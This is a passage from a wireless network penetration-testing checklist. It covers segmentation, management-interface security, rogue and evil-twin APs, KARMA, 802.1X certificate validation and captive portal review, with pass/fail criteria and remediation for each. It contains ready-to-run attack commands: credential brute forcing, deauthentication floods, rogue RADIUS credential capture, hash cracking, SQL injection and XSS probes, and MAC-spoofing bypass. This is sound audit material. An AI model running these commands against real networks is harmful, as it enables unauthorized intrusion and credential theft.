# Look for: SSH(22), Telnet(23), RDP(3389), WinRM(5985/5986),
#           HTTP/HTTPS(80/443), SMB(445), DB ports, SNMP(161), LDAP(389)
```

### 15.9 Identify Network Management Interfaces

```bash
sudo nmap -p 22,23,80,161,443,830,8080,8443 <gateway_range> -sV
curl -I http://<AP_IP>/
curl -I https://<AP_IP>/
```

### 15.10 Identify Authentication Infrastructure Exposure

```bash
sudo nmap -sU -p 1812,1813 <radius_server>
sudo nmap -p 389,636,3268,3269 <domain_controller>
ldapsearch -x -H ldap://<DC_IP> -b "" -s base
```

### 15.11 Identify Unnecessary Broadcast Services

```bash
sudo tcpdump -i wlan0 broadcast or multicast
sudo tshark -i wlan0 -Y "llmnr or nbns" \
  -T fields -e ip.src -e llmnr.qry.name -e nbns.name
sudo tshark -i wlan0 -Y "mdns"
```

### 15.12 Identify Exposed File-Sharing Services

```bash
smbclient -L \\<target_IP>\ -N
smbmap -H <target_IP>
showmount -e <target_IP>
nmap -p 21 <target_IP> --script ftp-anon
```

### 15.13 Identify Exposed Administrative Services

```bash
sudo nmap -p 22,23,3389,5985,5986 <subnet/24> -sV
nmap -p 3389 <target_IP> --script rdp-enum-encryption
nmap -p 22 <target_IP> --script ssh2-enum-algos
```

### 15.14 Identify Exposed Printers

```bash
sudo nmap -p 9100,515,631 <subnet/24> -sV
snmpwalk -v2c -c public <printer_IP> 1.3.6.1.2.1.43
```

### 15.15 Identify Exposed IoT Infrastructure

```bash
sudo nmap -sV <subnet/24> -p 80,443,8883,1883,5683,23,8080 --open
mosquitto_sub -h <target_IP> -t "#" -v
```

### 15.16 Identify Exposed Network Infrastructure

```bash
sudo nmap -p 23,80,161,443,8080,22,830 <gateway_range> -sV
snmpwalk -v2c -c public <infrastructure_IP> system
```

### 15.17 Identify Unexpected Routing Paths

```bash
traceroute 8.8.8.8
traceroute <corporate_server>
traceroute <management_ip>
ip route show
ip rule show
```

**Evidence (for all 15.x):** Network enumeration output table; routing trace screenshots.

**Remediation:** Implement strict VLAN segmentation with ACLs; zero-trust network access.

---

## 16. VLAN & Segmentation Testing — Guest WLAN

### 16.1 Verify Corporate-Network Isolation

**Commands:**

```bash
# From guest SSID
sudo nmap -sn <corporate_subnet/24>
ping <corporate_server_IP>
traceroute <corporate_server_IP>
nmap -p 80,443,445,3389,22 <corporate_server_IP>
curl http://<corporate_intranet_URL>
```

**Pass Criteria:** All probes to corporate subnet time out or are blocked.  
**Fail Criteria:** Corporate hosts respond to any probe from guest WLAN.

**Reference:** nmap -sn / nmap -sV <range> / arp-scan -l / ping sweep across segments

**Remediation:** Dedicated VLAN for guest WLAN; ACLs blocking all corporate subnets; default-deny firewall policy.

---

### 16.2 Verify Server-Network Isolation

```bash
nmap -sn <server_subnet/24>
nmap -p 80,443,3306,5432,1433,22 <server_subnet/24>
smbclient -L \\<server_IP>\ -N
```

**Pass Criteria:** Server subnet unreachable from guest WLAN.

---

### 16.3 Verify Management-Network Isolation

```bash
sudo nmap -sn <mgmt_subnet/24>
nmap -p 22,23,80,161,443,8080 <mgmt_subnet/24>
curl http://<AP_management_IP>/
```

**Pass Criteria:** Management subnet completely unreachable from guest WLAN.

---

### 16.4 Verify IoT Isolation

```bash
nmap -sn <iot_subnet/24>
nmap -p 80,8080,1883,5683 <iot_subnet/24>
```

---

### 16.5 Verify Client-to-Client Isolation

```bash
# Connect two devices to guest SSID simultaneously
# From Device 1:
ping <Device2_IP>
nmap -sn <Device2_IP>
```

**Pass Criteria:** Client-to-client communication blocked.  
**Fail Criteria:** Direct client-to-client communication possible.

**Remediation:** Enable "Client Isolation" / "AP Isolation" in AP settings for guest SSID.

---

### 16.6 Verify Internal DNS Restrictions

```bash
nslookup internal-server <dns_server>
dig @<dns_server> internal.corporate.com
dig @<dns_server> sharepoint.corporate.local
dig @<dns_server> corporate.local AXFR
```

**Pass Criteria:** Internal hostnames return NXDOMAIN from guest; zone transfer refused.

---

### 16.7 Verify Internal Routing Restrictions

```bash
ip route show
for subnet in 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16; do
  echo "Testing $subnet:"
  nmap -sn $subnet --exclude <your_IP> 2>&1 | grep "Host is up" | head -5
done
```

**Pass Criteria:** Only internet routing available from guest.

**Evidence (all 16.x):** nmap output showing blocked or accessible segments.

---

## 17. Wireless Management-Plane Security

### 17.1 Verify HTTPS Administration

```bash
nmap -p 22,23,80,161,443,8080 <controller_ip> -sV
curl -v http://<AP_IP>/
curl -I http://<AP_IP>/
curl -v https://<AP_IP>/
sslscan <AP_IP>:443
```

**Pass Criteria:** HTTP redirects to HTTPS or is blocked; TLS >= 1.2; valid certificate.  
**Fail Criteria:** HTTP accessible; self-signed cert; TLS 1.0/1.1.

**Reference:** nmap -p 22,23,80,161,443,8080 <controller_ip> / manual admin portal review

---

### 17.2 Check for Unnecessary HTTP Access

```bash
curl -I http://<AP_IP>/
nmap -p 80 <AP_IP> --script http-title,http-headers
```

**Fail Criteria:** HTTP returns 200 with management content.

---

### 17.3 Check SSH Configuration

```bash
nmap -p 22 <AP_IP> -sV
nmap -p 22 <AP_IP> --script ssh2-enum-algos,ssh-hostkey
nmap -p 22 <AP_IP> --script sshv1
ssh -o PreferredAuthentications=password admin@<AP_IP>
```

**Pass Criteria:** SSHv2 only; strong algorithms; no password auth without MFA.  
**Fail Criteria:** SSHv1 supported; weak algorithms; default credentials.

---

### 17.4 Check Telnet Exposure

```bash
nmap -p 23 <AP_IP> -sV
telnet <AP_IP>
```

**Fail Criteria:** Telnet accessible.

**Remediation:** Disable Telnet; use SSH exclusively.

---

### 17.5 Check SNMP Exposure

```bash
nmap -sU -p 161 <AP_IP> -sV
snmpwalk -v1 -c public <AP_IP>
snmpwalk -v2c -c public <AP_IP>
snmpwalk -v2c -c private <AP_IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <AP_IP>
snmpset -v2c -c private <AP_IP> sysLocation.0 s "test_write"
```

**Pass Criteria:** SNMPv3 with AuthPriv; default community strings rejected.  
**Fail Criteria:** SNMPv1/v2c with default or guessable community string.

---

### 17.6 Check Management API Exposure

```bash
nmap -p 8080,8443,9090,4343,4444 <AP_IP> -sV
curl -k https://<AP_IP>:4343/v1/
curl -k https://<AP_IP>:8443/api/
curl -k https://<controller_IP>/api/
```

**Pass Criteria:** APIs require authentication; HTTPS; not accessible from wireless.  
**Fail Criteria:** Unauthenticated API endpoints; HTTP API.

---

### 17.7 Check Administrative Authentication

```bash
# Test default credentials
for cred in "admin:admin" "admin:password" "ubnt:ubnt" "admin:cisco"; do
  user="${cred%:*}"; pass="${cred#*:}"
  curl -k -s -o /dev/null -w "$cred: %{http_code}\n" -u "$user:$pass" https://<AP_IP>/
done

hydra -l admin -P /usr/share/wordlists/top_passwords.txt <AP_IP> https-get /
```

**Fail Criteria:** Default credentials accepted; no lockout policy.

---

### 17.8 Check MFA

**Procedure:** Log into management portal with valid admin credentials. Observe whether a second factor is prompted.

**Pass Criteria:** MFA enforced for all admin logins.  
**Fail Criteria:** MFA not required; password-only authentication accepted.

**Remediation:** Implement RADIUS-based MFA (Duo, RSA) for all management interfaces.

---

### 17.9 Check Administrator Authorization

```bash
curl -k -u read_only_admin:<pass> -X POST https://<AP_IP>/api/config/ssid
```

**Pass Criteria:** Role-based access control enforced; read-only users cannot make changes.  
**Fail Criteria:** All admin accounts have full privileges; no RBAC.

---

### 17.10 Check Administrative Session Timeout

```bash
# Leave session idle and measure timeout duration
# Test post-logout cookie reuse:
curl -b "session=<captured_cookie>" https://<AP_IP>/admin/
```

**Pass Criteria:** Session times out in <= 15 minutes; session invalidated on logout.  
**Fail Criteria:** No session timeout; session token reusable after logout.

---

### 17.11 Check Administrative Logging

```bash
# Perform admin actions, then review audit log
nmap -sU -p 514 <syslog_server_IP>
sudo tshark -i eth0 -Y "syslog" -T fields -e syslog.msg
nmap -sU -p 123 <AP_IP>   # NTP check
```

**Pass Criteria:** All admin actions logged; logs forwarded to SIEM; NTP synchronized.  
**Fail Criteria:** Audit logging disabled; no SIEM forwarding.

---

### 17.12 Check Management-Source Restrictions

```bash
curl https://<AP_management_IP>/   # from wireless client (should fail)
nmap -p 22,80,443 <AP_IP>          # from test source
```

**Pass Criteria:** Management access only from authorized management VLAN.

---

### 17.13 Check Default Administrative Accounts

```bash
for user in admin ubnt root super user cisco; do
  curl -k -u "$user:$user" https://<AP_IP>/api/ -o /dev/null -w "$user: %{http_code}\n"
done
```

**Fail Criteria:** Default account accessible.

**Remediation:** Remove or disable vendor default accounts on initial deployment.

---

### 17.14 Check Default Credentials

*(See section 17.13 and 6.8)*

---

### 17.15 Check Unused Accounts

**Procedure:** Login to admin portal; review user accounts; check last-login timestamps (>90 days = stale); identify orphaned accounts.

**Remediation:** Quarterly account review; disable accounts inactive > 60 days.

---

### 17.16 Check Privileged Accounts

**Procedure:** Enumerate all admin accounts and roles. Verify each privileged account has legitimate business need.

**Remediation:** Implement least-privilege; use PAM solution; no shared privileged accounts.

---

### 17.17 Check Password Policies

```bash
curl -k -u admin:<current_pass> -X POST https://<AP_IP>/api/user \
  -d '{"password":"abc123"}'

for i in {1..10}; do
  curl -k -u admin:wrongpassword https://<AP_IP>/ -o /dev/null -w "$i: %{http_code}\n"
done
```

**Pass Criteria:** Minimum 12+ character password; complexity enforced; lockout after 5 failures.  
**Fail Criteria:** Weak password accepted; no lockout policy.

---

### 17.18 Identify Authorized AP Inventory

```bash
sudo airodump-ng wlan0mon --write ap_inventory --output-format csv
sudo kismet -c wlan0mon
```

---

### 17.19 Compare Observed APs Against Authorized Inventory

```bash
python3 -c "
import csv
authorized = set()
with open('authorized_aps.csv') as f:
    for row in csv.DictReader(f):
        authorized.add(row['BSSID'].upper())
observed = set()
with open('ap_inventory-01.csv') as f:
    for row in csv.DictReader(f):
        bssid = row.get(' BSSID','').strip().upper()
        if bssid: observed.add(bssid)
print('ROGUE:', observed - authorized)
print('OFFLINE:', authorized - observed)
"
```

---

### 17.20 Identify Unknown BSSIDs

```bash
sudo airodump-ng wlan0mon
macchanger --lookup <OUI_prefix>
```

---

### 17.21 Identify Duplicate Corporate SSIDs

```bash
sudo airodump-ng wlan0mon
# Same SSID with different BSSID = potential evil twin

tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan.bssid -e wlan.ssid | sort | uniq -d
```

---

### 17.22 Identify Unauthorized AP Hardware

```bash
sudo airodump-ng wlan0mon
# Check BSSID OUI against authorized AP hardware vendor list
```

---

### 17.23 Identify Unauthorized Personal Hotspots

```bash
sudo airodump-ng wlan0mon
# Look for: iPhone SSIDs, Android hotspot SSIDs, Windows hotspot SSIDs
# AUTH=PSK = likely personal hotspot
```

**Remediation:** MDM policy prohibiting personal hotspots; WIDS to detect/block hotspots.

---

### 17.24 Identify Unauthorized Repeaters

```bash
sudo airodump-ng wlan0mon
# Repeaters: same SSID, different BSSID, lower signal quality

tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan.bssid -e wlan.ssid -e radiotap.dbm_antsignal
```

---

### 17.25 Identify Suspicious Signal Patterns

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon --write rf_survey --output-format csv
sudo kismet -c wlan0mon
```

**Remediation:** Reduce AP transmit power; adjust antenna direction; install RF-absorbing materials.

---

### 17.26 Verify WIDS/WIPS Detection

```bash
# Trigger WIDS events (authorized):
sudo aireplay-ng --deauth 20 -a <BSSID> wlan0mon
sudo mdk4 wlan0mon b
sudo airbase-ng -e "<SSID>" -c <channel> wlan0mon
sudo reaver -i wlan0mon -b <BSSID> -c <channel> -vv
```

**Pass Criteria:** WIDS alerts generated within 60 seconds for each attack type.  
**Fail Criteria:** WIDS fails to detect attacks.

**Evidence:** WIDS console screenshots showing alerts.

---

## 18. Evil-Twin / Impersonation Resilience

> CRITICAL NOTICE: All tests in this section require EXPLICIT WRITTEN AUTHORIZATION in the Rules of Engagement.

### 18.1 Only Perform Active Impersonation Testing When Explicitly Authorized

**Procedure:** Review RoE for explicit authorization; define test window; obtain written sign-off; have kill switch ready.

**Tools (authorized use only):**
```bash
sudo airbase-ng -e "<TARGET_SSID>" -c <channel> wlan0mon
sudo hostapd-mana /etc/hostapd-mana/mana.conf
# Reference: airbase-ng / hostapd-mana (rogue AP simulation) — only if RoE authorizes
```

---

### 18.2 Determine Whether Corporate SSIDs Can Be Imitated

```bash
sudo airodump-ng wlan0mon
sudo airbase-ng -e "<CORPORATE_SSID>" -c <channel> wlan0mon   # authorized only
```

**Pass Criteria:** WIDS detects rogue AP; clients have 802.1X certificate validation.  
**Fail Criteria:** No WIDS detection; clients associate.

---

### 18.3 Determine Whether Clients Automatically Connect to Previously Trusted Networks

*(See Section 20 — KARMA Attack)*

---

### 18.4 Assess Client Certificate Validation

```bash
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
cat /var/log/hostapd-wpe.log
```

**Pass Criteria:** Clients reject certificate from unknown CA; no credentials submitted.  
**Fail Criteria:** Clients accept self-signed certificate; credentials captured.

**Remediation:** Configure supplicants to validate RADIUS server cert; pin CA cert; use EAP-TLS.

---

### 18.5 Assess Enterprise Authentication Configuration

```bash
tshark -i wlan0mon -Y "eap" -T fields -e eap.type
# EAP type 25 = PEAP, 21 = TTLS, 13 = TLS

sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
asleap -C <challenge> -R <response> -W rockyou.txt
hashcat -m 5500 mschapv2.txt rockyou.txt
```

**Remediation:** EAP-TLS with mutual authentication; PEAP-MSCHAPv2 with cert validation.

---

### 18.6 Verify WIDS/WIPS Detection

*(See section 17.26)*

---

### 18.7 Verify Rogue-AP Alerting

```bash
sudo airbase-ng -e "<CORPORATE_SSID>" -c <channel> wlan0mon
# Note start time; monitor WIDS console for alert; measure time-to-alert
```

**Pass Criteria:** WIDS alert within 60 seconds.  
**Fail Criteria:** No WIDS alert generated; alert > 5 minutes.

---

### 18.8 Verify Response Procedures

**Procedure:** Review incident response plan; simulate rogue AP event (authorized); observe response; interview wireless administrator.

**Pass Criteria:** Documented response playbook exists; SOC received and acted within SLA.

---

### 18.9 Document Whether an Impersonating AP Could Attract Authorized Clients

```bash
sudo airodump-ng --bssid <ROGUE_BSSID> -c <channel> wlan0mon
# STATION column shows any attracted clients
macchanger --lookup <client_MAC_OUI>
```

**Evidence:** Count of clients attracted to rogue AP.

---

### 18.10 Avoid Collecting Credentials Unless Explicitly Authorized

**Guideline:** If credentials are inadvertently captured, immediately cease collection. Report exposure risk without retaining actual credentials.

---

### 18.11 Avoid Retaining Unnecessary Authentication Material

**Guideline:** Delete captured credential files after analysis. Ensure PCAP files are encrypted at rest and deleted per engagement data handling policy.

---

## 19. Common Wireless Findings to Check Explicitly

### 19.1 Check for Weak Wi-Fi Password
```bash
hcxpcapngtool -o wpa.22000 capture.cap
hashcat -m 22000 wpa.22000 rockyou.txt
```
**Fail:** Password cracked. **Fix:** PSK >= 20 random characters; rotate quarterly.

### 19.2 Check for Password Reused Across SSIDs
Crack PSK for each SSID; compare results. **Fail:** Same PSK across multiple SSIDs. **Fix:** Unique PSK per SSID.

### 19.3 Check for Password Shared Excessively
**Procedure:** Interview admin; check if PSK is posted publicly or distributed widely in email.
**Fail:** PSK shared broadly. **Fix:** Implement 802.1X or per-user PSK; restrict PSK distribution.

### 19.4 Check for Password Never Rotated
**Procedure:** Review change management records for last PSK rotation date.
**Fail:** PSK never changed since installation or > 1 year old. **Fix:** Rotate PSK quarterly.

### 19.5 Check for WPA/WPA2 Legacy Configuration
```bash
sudo airodump-ng wlan0mon
# ENC column = WPA (v1)
```
**Fail:** WPA v1 (TKIP only) in use. **Fix:** Upgrade to WPA2-CCMP minimum; WPA3-SAE preferred.

### 19.6 Check for Weak Encryption
```bash
sudo airodump-ng wlan0mon
# CIPHER column = TKIP | ENC column = WEP | ENC column = OPN
```
**Fail:** WEP, TKIP, or OPN detected. **Fix:** WPA2-CCMP (AES) minimum; disable TKIP.

### 19.7 Check for TKIP Enabled
```bash
sudo airodump-ng wlan0mon | grep TKIP
```
**Fail:** TKIP cipher listed. **Fix:** Disable TKIP; CCMP/AES only.

### 19.8 Check for WPS Unnecessarily Enabled
```bash
sudo wash -i wlan0mon
```
**Fail:** Any AP shows WPS enabled. **Fix:** Disable WPS in AP configuration.

### 19.9 Check for Open Corporate WLAN
```bash
sudo airodump-ng wlan0mon | grep OPN
```
**Fail:** Corporate SSID shows ENC=OPN. **Fix:** Enforce WPA3-SAE or WPA2-CCMP immediately.

### 19.10 Check for Missing Client Isolation
```bash
# Connect two devices to same SSID
ping <device2_IP>
```
**Fail:** Clients can communicate directly. **Fix:** Enable "Client Isolation" or "AP Isolation" in AP settings.

### 19.11 Check for Missing Guest Isolation
*(Same as 19.10 on guest SSID)* **Fix:** Enable client isolation on guest SSID; place on separate VLAN.

### 19.12 Check for Guest-to-Corporate Access
```bash
nmap -sn <corporate_subnet/24>   # from guest SSID
ping <corporate_server_IP>
```
**Fail:** Corporate resources reachable from guest. **Fix:** VLAN + firewall ACLs; default-deny.

### 19.13 Check for IoT-to-Corporate Access
```bash
nmap -sn <corporate_subnet/24>   # from IoT SSID
```
**Fail:** Corporate resources reachable from IoT. **Fix:** Strict VLAN segmentation; zero-trust for IoT.

### 19.14 Check for Wireless-to-Management Access
```bash
nmap -p 22,23,80,161,443,8080 <management_subnet/24>   # from wireless
```
**Fail:** Management hosts reachable from wireless. **Fix:** Block wireless-to-management at firewall; use jump host.

### 19.15 Check for Wireless-to-Server Access
```bash
nmap -sV <server_subnet/24>   # from wireless
```
**Fail:** Servers directly reachable from wireless. **Fix:** Server VLAN blocked from wireless.

### 19.16 Check for Wireless-to-Security-Infrastructure Access
```bash
nmap -p 1812,1813,514,636,389 <security_infra_IPs>   # from wireless
```
**Fail:** RADIUS, LDAP, Syslog servers reachable from wireless. **Fix:** Restrict to management VLAN only.

### 19.17 Check for IPv6 Segmentation Bypass
```bash
ip -6 addr show
nmap -6 -sn fe80::/10
nmap -6 <corporate_ipv6_range>   # from wireless/guest
```
**Fail:** Corporate IPv6 resources reachable from guest/wireless. **Fix:** IPv6 ACLs; RA Guard.

### 19.18 Check for Weak Enterprise Authentication
```bash
tshark -i wlan0mon -Y "eap.type == 17 or eap.type == 4"
# EAP type 17 = LEAP, 4 = MD5
```
**Fail:** LEAP or EAP-MD5 in use. **Fix:** Replace with EAP-TLS or PEAP-MSCHAPv2 with cert validation.

### 19.19 Check for Missing Certificate Validation
```bash
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Clients connecting = certificate validation not enforced
```
**Fail:** Clients connect to rogue RADIUS without cert validation. **Fix:** Configure supplicant to validate RADIUS cert; pin CA cert.

### 19.20 Check for Insecure EAP Configuration
```bash
tshark -i wlan0mon -Y "eap" -T fields -e eap.type
```
**Fail:** EAP-MD5, LEAP, EAP-TTLS without certificate validation. **Fix:** Use EAP-TLS; PEAP-MSCHAPv2 with cert.

### 19.21 Check for Rogue AP
```bash
sudo airodump-ng wlan0mon
# Compare all BSSIDs against authorized AP inventory
```
**Fail:** Any BSSID not in authorized inventory. **Fix:** Investigate rogue AP; enhance WIDS coverage.

### 19.22 Check for Evil-Twin Exposure
*(See section 18)*

### 19.23 Check for Inadequate Rogue-AP Detection
```bash
sudo airbase-ng -e "<SSID>" -c <channel> wlan0mon
# Measure time-to-detection in WIDS console
```
**Fail:** No detection within 5 minutes; no WIDS deployed. **Fix:** Deploy WIDS; tune detection thresholds.

### 19.24 Check for Default AP Credentials
```bash
nmap -p 22,23,80,443,8080 <AP_IP> -sV
curl -u admin:admin http://<AP_IP>/
```
**Fail:** Default credentials accepted. **Fix:** Change all default credentials on deployment.

### 19.25 Check for Default Controller Credentials
```bash
curl -k -u admin:admin https://<controller_IP>/
```
**Fail:** Default credentials accepted on controller. **Fix:** Change all controller credentials.

### 19.26 Check for Exposed Management Interface
```bash
nmap -p 22,23,80,161,443,8080 <AP_IP> -sV
# From wireless segment — should be inaccessible
```
**Fail:** Management interface reachable from wireless or guest. **Fix:** Restrict management to dedicated management VLAN.

### 19.27 Check for HTTP Administration
```bash
curl -I http://<AP_IP>/
# 200 OK = FAIL
```
**Fix:** Disable HTTP; enforce HTTPS with valid certificate.

### 19.28 Check for Telnet Administration
```bash
nmap -p 23 <AP_IP>
# Open = FAIL
```
**Fix:** Disable Telnet; use SSH.

### 19.29 Check for Weak SNMP Configuration
```bash
snmpwalk -v2c -c public <AP_IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <AP_IP>
```
**Fail:** Default community string works. **Fix:** SNMPv3 with AuthPriv; restrict to management VLAN.

### 19.30 Check for Outdated Firmware
```bash
snmpwalk -v2c -c public <AP_IP> sysDescr
# Compare with vendor's latest release notes / security advisories
```
**Fail:** Firmware > 6 months old or known CVEs unpatched. **Fix:** Update firmware; subscribe to vendor security advisories.

### 19.31 Check for End-of-Life AP/Controller
**Procedure:** Identify AP model; check vendor EOL announcement; verify whether security patches still available.
**Fail:** AP or controller is end-of-life. **Fix:** Replace EOL hardware; budget replacement cycle.

### 19.32 Check for Excessive Wireless Coverage
```bash
# Walk building perimeter with airodump-ng
sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon
# Record PWR column at perimeter locations
# Signal > -70 dBm outside building = excessive
```
**Fix:** Reduce AP transmit power; use directional antennas; add RF shielding.

### 19.33 Check for Inadequate Logging
**Procedure:** Check AP syslog configuration; verify logs forwarded to SIEM; check retention period; verify NTP.
**Fail:** No syslog forwarding; retention < 90 days; no NTP. **Fix:** Configure syslog to SIEM; set retention policy.

### 19.34 Check for Inadequate SIEM Integration
**Procedure:** Generate a known event; verify event appears in SIEM with correct timestamp.
**Fail:** Events not appearing in SIEM. **Fix:** Configure syslog/SNMP trap forwarding; create wireless security alert rules.

### 19.35 Check for Inadequate Wireless Monitoring
**Procedure:** Review WIDS/WIPS deployment coverage; check all channels and bands are monitored; verify 24/7 monitoring.
**Fail:** WIDS not deployed; partial channel coverage. **Fix:** Deploy WIDS with full channel coverage; integrate with 24/7 SOC.

### 19.36 Check for Inadequate NAC
```bash
# Connect with non-compliant device; observe if NAC quarantines
ip addr show wlan0
ping <GATEWAY_IP>
# If ping succeeds without posture check = FAIL
```
**Fix:** Implement 802.1X-based NAC with device posture validation.

### 19.37 Check for Excessive Administrative Privileges
*(See section 17.9)*

### 19.38 Check for Missing MFA
*(See section 17.8)*

### 19.39 Check for Insecure Cloud WLAN Administration
```bash
curl -H "X-Cisco-Meraki-API-Key: <test_key>" https://api.meraki.com/api/v1/organizations
# Check if MFA enforced on cloud portal
```
**Pass:** MFA enforced; API keys rotated; least-privilege API permissions. **Fix:** Enable MFA on cloud portal; scope API keys.

### 19.40 Check for Excessively Permissive Firewall Rules
```bash
nmap -sV --top-ports 1000 <all_discovered_subnets>
hping3 --syn -p 1-65535 <internal_IP>
```
**Fail:** Permissive rules allow wireless to access internal resources broadly.
**Fix:** Default-deny firewall policy; explicit allow rules only.

### 19.41 Check for Unnecessary Exposed Services
```bash
sudo nmap -sV -p- --open <target_hosts>   # from wireless segment
```
**Fail:** Telnet, FTP, HTTP management, SMTP relay exposed from wireless. **Fix:** Disable unnecessary services.

### 19.42 Check for Insecure Guest Portal
```bash
curl -I http://<portal_IP>/   # Should redirect to HTTPS
sqlmap -u "http://<portal_IP>/login" --forms --dbs
# MAC-based bypass:
sudo macchanger -m <previously_authorized_MAC> wlan0
```
**Fail:** HTTP portal; bypass via MAC; SQL injection; no session timeout.
**Fix:** Enforce HTTPS; input validation; CSRF tokens; rate limiting.

### 19.43 Check for Legacy Wireless Compatibility
```bash
sudo airodump-ng wlan0mon
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan.ssid -e wlan_mgt.supported_rates | grep "02 04 0b 16"
# 02 04 0b 16 = 1,2,5.5,11 Mbps (802.11b rates)
```
**Fail:** 802.11b/g-only rates supported; WEP/TKIP required for legacy devices.
**Fix:** Disable 802.11b rates; phase out legacy devices.

---

## 20. KARMA Attack

**Finding:** KARMA Attack  
**Objective:** Determine whether devices automatically connect to previously trusted SSIDs.

**Overview:** The KARMA attack exploits probe request behavior of wireless clients. Clients broadcast names (SSIDs) of previously connected networks. A KARMA-capable rogue AP responds to these probes, causing clients to automatically associate.

**Step-by-Step Procedure:**
1. Enable monitor mode.
2. Capture probe requests passively.
3. Deploy KARMA/MANA-capable rogue AP (only if authorized).
4. Observe client probe requests and automatic associations.

**Commands:**

```bash
# Step 1: Monitor mode
sudo airmon-ng start wlan0

# Step 2: Capture probe requests (passive)
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa -e wlan.ssid
# Lists devices broadcasting previously connected SSIDs

# Step 3: Deploy KARMA/MANA (only if authorized)
sudo hostapd-mana /etc/hostapd-mana/mana.conf
# mana.conf example:
# interface=wlan0mon
# ssid=KARMAtest
# driver=nl80211
# channel=6
# mana_loud=1   # Karma mode

# Step 4: Monitor associations
sudo airodump-ng wlan0mon
# Clients auto-connecting appear in STATION list under rogue BSSID
```

**What to Look For:**
- Devices broadcasting probe requests for old/personal SSIDs
- Devices auto-associating with KARMA AP without user interaction

**Pass Criteria:** No auto-association observed; WIDS detects KARMA AP; clients require user interaction to connect.  
**Fail Criteria:** Client devices automatically associate with rogue AP.

**Evidence to Capture:**
- `tshark` output showing probe requests with SSIDs
- `airodump-ng` screenshot showing auto-associated clients

**Remediation:**
- Disable automatic reconnection to open/unknown networks via MDM policy
- Flush the Preferred Network List (PNL) on corporate devices
- Use 802.1X with certificate validation
- Enable WIDS to detect KARMA attacks

---

## 21. Loud-Mouth / Preferred Network List (PNL)

**Finding:** Loud-Mouth / Preferred Network List (PNL) Exposure  
**Objective:** Evaluate whether probe requests expose previously connected SSIDs and assess information disclosure risk.

**Step-by-Step Procedure:**
1. Enable monitor mode.
2. Passively capture probe request frames.
3. Extract SSIDs from probe requests.
4. Analyze disclosed SSIDs for sensitive information.

**Commands:**

```bash
# Capture all probe requests
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 4" \
  -T fields -e frame.time -e wlan.sa -e wlan.ssid -e radiotap.dbm_antsignal

# Or with airodump-ng (shows probed SSIDs in lower pane)
sudo airodump-ng wlan0mon

# Passive PNL harvesting
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 4 && wlan.ssid != ''" \
  -T fields -e wlan.sa -e wlan.ssid | sort | uniq
```

**What to Look For:**
- SSIDs of home networks, hotels, conferences, personal hotspots
- Corporate SSID names in PNL (reveals organizational naming)
- Unique/sensitive SSID names enabling targeted KARMA

**Pass Criteria:** Corporate devices send null probes (no SSID disclosed); MDM policy enforced.  
**Fail Criteria:** Corporate devices broadcasting PNL entries with sensitive SSID names.

**Evidence to Capture:**
- `tshark` output listing device MACs and probed SSIDs
- Table of disclosed SSIDs and their sensitivity level

**Remediation:**
- Configure MDM to suppress directed probe requests
- Periodically flush PNL on corporate devices
- Verify MAC randomization enabled on corporate devices (iOS 14+/Android 10+)
- Avoid corporate SSID names that reveal organizational information

---

## 22. 802.1X Certificate Validation

**Finding:** 802.1X Certificate Validation  
**Objective:** Verify that clients correctly validate the RADIUS server certificate.

**Step-by-Step Procedure:**
1. Deploy a rogue RADIUS server with a self-signed certificate using hostapd-wpe.
2. Create an evil-twin AP pointing to the rogue RADIUS server.
3. Observe whether clients connect and submit credentials without validating the certificate.
4. Review supplicant configuration for certificate validation settings.

**Commands:**

```bash
sudo apt install hostapd-wpe

# Configure and start rogue RADIUS
# Edit /etc/hostapd-wpe/hostapd-wpe.conf
# Key settings: interface=wlan0mon, ssid=<CORPORATE_SSID>, eap_server=1
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Monitor for credential submissions
tail -f /var/log/hostapd-wpe.log

# Crack captured MSCHAPv2
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
hashcat -m 5500 mschapv2_capture.txt rockyou.txt

# Verify supplicant config on clients:
# ca_cert="/path/to/ca.crt"              <- Must be present
# subject_match="CN=radius.corporate.com" <- Certificate pinning
```

**What to Look For:**
- Clients connecting to rogue RADIUS and submitting credentials = certificate NOT validated
- Credentials appearing in `/var/log/hostapd-wpe.log`

**Pass Criteria:** No credentials submitted to rogue RADIUS; clients reject unknown CA certificate.  
**Fail Criteria:** Credentials captured by rogue RADIUS server.

**Evidence to Capture:**
- hostapd-wpe log showing captured credential challenge/response (redact actual credentials)
- Supplicant configuration showing presence/absence of `ca_cert` directive

**Remediation:**
- Configure all EAP supplicants with `ca_cert` pointing to internal CA certificate
- Configure `subject_match` or `altsubject_match` to pin RADIUS server identity
- Use EAP-TLS (client+server certificates) to eliminate password-based EAP
- Deploy MDM to enforce supplicant configuration

---

## 23. Captive Portal Logic Review

**Finding:** Captive Portal Logic Review  
**Objective:** Evaluate authentication flow, session handling, and authorization enforcement.

**Step-by-Step Procedure:**
1. Connect to guest SSID and observe captive portal.
2. Test HTTPS enforcement.
3. Test authentication mechanisms.
4. Attempt authentication bypasses.
5. Test session management.
6. Test for web vulnerabilities.

**Commands:**

```bash
# Check portal protocol
curl -I http://1.1.1.1   # Should redirect to portal

# Test HTTPS enforcement
curl -I https://<portal_IP>/
sslscan <portal_IP>:443

# MAC spoofing bypass
sudo macchanger -m <AUTHORIZED_MAC> wlan0   # reconnect and check

# DNS tunneling bypass (see section 6.4)

# SQL injection
sqlmap -u "http://<portal_IP>/login?user=test&pass=test" --dbs

# XSS test
curl "http://<portal_IP>/login?user=<script>alert(1)</script>"

# Session management: save cookie, logout, reuse
curl -b "session=<captured_cookie>" http://<portal_IP>/restricted/

